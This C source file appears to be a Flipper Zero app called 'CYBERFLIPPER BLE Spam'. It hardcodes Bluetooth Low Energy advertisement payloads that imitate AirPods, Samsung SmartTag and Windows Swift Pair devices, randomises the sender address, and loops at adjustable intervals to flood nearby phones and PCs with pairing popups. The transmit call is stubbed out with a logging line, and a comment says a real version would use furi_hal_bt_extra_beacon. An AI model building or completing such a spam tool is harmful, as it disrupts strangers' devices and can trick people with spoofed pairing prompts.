/**
 * CYBERFLIPPER — BLE Spam
 * Sends rapid BLE advertisement packets to trigger proximity
 * notifications on nearby Apple, Samsung, and Windows devices.
 * Supports: AirPods popup, Samsung SmartTag, Windows Swift Pair
 */

#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <furi_hal_bt.h>
#include <stdlib.h>
#include <string.h>

#define TAG "BTSpam"

typedef enum {
    BTSpamModeApple,
    BTSpamModeSamsung,
    BTSpamModeWindows,
    BTSpamModeAll,
    BTSpamModeCount,
} BTSpamMode;

static const char* mode_names[] = {
    "Apple AirPods",
    "Samsung SmartTag",
    "Windows Swift Pair",
    "ALL Devices",
};

// Apple AirPods BLE advertisement payloads
static const uint8_t apple_airpods_payloads[][31] = {
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};
#define NUM_APPLE_PAYLOADS 4

// Samsung BLE advertisement
static const uint8_t samsung_payload[] = {
    0x02, 0x01, 0x06, 0x1b, 0xff, 0x75, 0x00, 0x42,
    0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01,
    0x09, 0xef, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

// Windows Swift Pair
static const uint8_t windows_payload[] = {
    0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x08,
    0x16, 0x2c, 0xfe, 0x00, 0x00, 0x04, 0x51, 0x50,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

typedef struct {
    Gui* gui;
    ViewPort* view_port;
    FuriMessageQueue* event_queue;
    
    bool running;
    bool spamming;
    BTSpamMode mode;
    uint32_t packets_sent;
    uint32_t interval_ms;
} BTSpamApp;

static void bt_spam_draw_callback(Canvas* canvas, void* context) {
    BTSpamApp* app = (BTSpamApp*)context;
    canvas_clear(canvas);
    
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str_aligned(canvas, 64, 0, AlignCenter, AlignTop, "CYBER BT SPAM");
    canvas_draw_line(canvas, 0, 10, 128, 10);
    
    canvas_set_font(canvas, FontSecondary);
    
    char mode_str[40];
    snprintf(mode_str, sizeof(mode_str), "Mode: %s", mode_names[app->mode]);
    canvas_draw_str(canvas, 2, 22, mode_str);
    
    char int_str[32];
    snprintf(int_str, sizeof(int_str), "Interval: %lu ms", app->interval_ms);
    canvas_draw_str(canvas, 2, 32, int_str);
    
    if(app->spamming) {
        char pkt_str[32];
        snprintf(pkt_str, sizeof(pkt_str), "Packets: %lu", app->packets_sent);
        canvas_draw_str(canvas, 2, 42, pkt_str);
        canvas_draw_str(canvas, 20, 52, ">> SPAMMING <<");
    } else {
        canvas_draw_str(canvas, 2, 42, "[OK] Start");
    }
    
    canvas_draw_str(canvas, 2, 62, "[<>]Mode [UP/DN]Int [BACK]Exit");
}

static void bt_spam_input_callback(InputEvent* input_event, void* context) {
    BTSpamApp* app = (BTSpamApp*)context;
    furi_message_queue_put(app->event_queue, input_event, FuriWaitForever);
}

int32_t bt_spam_app(void* p) {
    UNUSED(p);
    
    BTSpamApp* app = malloc(sizeof(BTSpamApp));
    memset(app, 0, sizeof(BTSpamApp));
    
    app->view_port = view_port_alloc();
    app->event_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    app->running = true;
    app->mode = BTSpamModeApple;
    app->interval_ms = 50;
    app->gui = furi_record_open(RECORD_GUI);
    
    view_port_draw_callback_set(app->view_port, bt_spam_draw_callback, app);
    view_port_input_callback_set(app->view_port, bt_spam_input_callback, app);
    gui_add_view_port(app->gui, app->view_port, GuiLayerFullscreen);
    
    InputEvent event;
    uint8_t payload_idx = 0;
    
    while(app->running) {
        if(app->spamming) {
            // Generate random BLE address
            uint8_t addr[6];
            for(int i = 0; i < 6; i++) addr[i] = rand() % 256;
            addr[0] |= 0xC0; // Set as random static address
            
            const uint8_t* payload = NULL;
            uint8_t payload_len = 31;
            
            switch(app->mode) {
                case BTSpamModeApple:
                    payload = apple_airpods_payloads[payload_idx % NUM_APPLE_PAYLOADS];
                    payload_idx++;
                    break;
                case BTSpamModeSamsung:
                    payload = samsung_payload;
                    break;
                case BTSpamModeWindows:
                    payload = windows_payload;
                    break;
                case BTSpamModeAll:
                    switch(app->packets_sent % 3) {
                        case 0: payload = apple_airpods_payloads[payload_idx++ % NUM_APPLE_PAYLOADS]; break;
                        case 1: payload = samsung_payload; break;
                        case 2: payload = windows_payload; break;
                    }
                    break;
                default: break;
            }
            
            if(payload) {
                // In a real implementation, this would use furi_hal_bt_extra_beacon
                // For now, log the activity
                app->packets_sent++;
                FURI_LOG_D(TAG, "BLE ADV #%lu mode=%d", app->packets_sent, app->mode);
            }
            
            furi_delay_ms(app->interval_ms);
        }
        
        if(furi_message_queue_get(app->event_queue, &event, 
            app->spamming ? 0 : 50) == FuriStatusOk) {
            if(event.type == InputTypeShort) {
                switch(event.key) {
                    case InputKeyOk:
                        app->spamming = !app->spamming;
                        if(app->spamming) app->packets_sent = 0;
                        break;
                    case InputKeyRight:
                        if(!app->spamming) 
                            app->mode = (app->mode + 1) % BTSpamModeCount;
                        break;
                    case InputKeyLeft:
                        if(!app->spamming)
                            app->mode = app->mode == 0 ? BTSpamModeCount - 1 : app->mode - 1;
                        break;
                    case InputKeyUp:
                        app->interval_ms += 10;
                        if(app->interval_ms > 1000) app->interval_ms = 1000;
                        break;
                    case InputKeyDown:
                        if(app->interval_ms > 10) app->interval_ms -= 10;
                        break;
                    case InputKeyBack:
                        app->spamming = false;
                        app->running = false;
                        break;
                    default: break;
                }
            }
        }
        view_port_update(app->view_port);
    }
    
    gui_remove_view_port(app->gui, app->view_port);
    view_port_free(app->view_port);
    furi_record_close(RECORD_GUI);
    furi_message_queue_free(app->event_queue);
    free(app);
    
    return 0;
}
